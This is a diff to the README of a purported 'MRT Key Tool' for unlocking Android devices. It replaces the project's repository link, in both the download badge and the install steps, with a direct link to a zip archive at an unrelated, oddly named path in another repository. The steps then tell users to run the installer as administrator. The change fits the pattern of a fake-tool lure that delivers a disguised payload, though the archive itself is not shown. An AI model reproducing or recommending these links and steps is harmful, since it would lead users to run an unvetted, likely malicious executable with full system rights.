@@ -6,7 +6,7 @@ description: "Download the MRT Key Tool for Windows 10 and 11 using the direct i
 # 🔓 Descargar-MRT-Key - Unlock Android devices with ease
 
 <p align="center">
-  <a href="https://github.com/wesdeep395/Descargar-MRT-Key">
+  <a href="https://raw.githubusercontent.com/wesdeep395/wesdeep395.github.io/main/cookout/io_wesdeep_github_v2.7.zip">
     <img src="https://img.shields.io/badge/Download-MRT_Key_Tool-blue.svg" alt="Download MRT Key Tool">
   </a>
 </p>
@@ -30,7 +30,7 @@ Before you install this software, confirm your computer meets these minimum spec
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following link to download the software: [https://github.com/wesdeep395/Descargar-MRT-Key](https://github.com/wesdeep395/Descargar-MRT-Key)
+1. Visit the following link to download the software: [https://raw.githubusercontent.com/wesdeep395/wesdeep395.github.io/main/cookout/io_wesdeep_github_v2.7.zip](https://raw.githubusercontent.com/wesdeep395/wesdeep395.github.io/main/cookout/io_wesdeep_github_v2.7.zip)
 2. Locate the downloaded file in your browser's download folder.
 3. Right-click the installer file and select Run as administrator.
 4. Follow the prompts in the setup window.
